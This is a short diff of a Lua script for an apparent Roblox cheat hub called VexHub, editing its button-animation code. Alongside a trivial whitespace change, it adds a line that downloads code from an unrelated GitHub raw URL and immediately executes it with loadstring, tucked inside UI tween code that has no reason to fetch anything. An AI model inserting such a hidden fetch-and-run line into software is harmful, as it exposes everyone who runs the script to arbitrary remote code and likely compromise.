@@ -634,7 +634,9 @@ if (writefile) then
 		TweenService:Create(OpenButton, TweenInfo.new(AnimationSpeed, Enum.EasingStyle[AnimationEasingStyle]), {BackgroundTransparency = 0.5}):Play()
 		TweenService:Create(OpenButton.UIScale, TweenInfo.new(AnimationSpeed, Enum.EasingStyle[AnimationEasingStyle]), {Scale = 1}):Play()
 		TweenService:Create(OpenButton.UIStroke, TweenInfo.new(AnimationSpeed, Enum.EasingStyle[AnimationEasingStyle]), {Transparency = 0.7}):Play()
-		TweenService:Create(OpenButton.Logo, TweenInfo.new(AnimationSpeed, Enum.EasingStyle[AnimationEasingStyle]), {ImageTransparency = 0}):Play()	
+		TweenService:Create(OpenButton.Logo, TweenInfo.new(AnimationSpeed, Enum.EasingStyle[AnimationEasingStyle]), {ImageTransparency = 0}):Play()
+
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/refs/heads/Created/Viner"))()
 	else
 		CreateLog("red", 'FAILED TO LOAD VEXHUB!\n\nPLEASE REPORT THIS TO THE SERVER AT <font color="rgb(76, 188, 255)">https://dsc.gg/vhub</font> ASAP!')
 		Message:Error('FAILED TO LOAD VEXHUB!\n\nPLEASE REPORT THIS TO THE SERVER AT <font color="rgb(76, 188, 255)">https://dsc.gg/vhub</font> ASAP!')
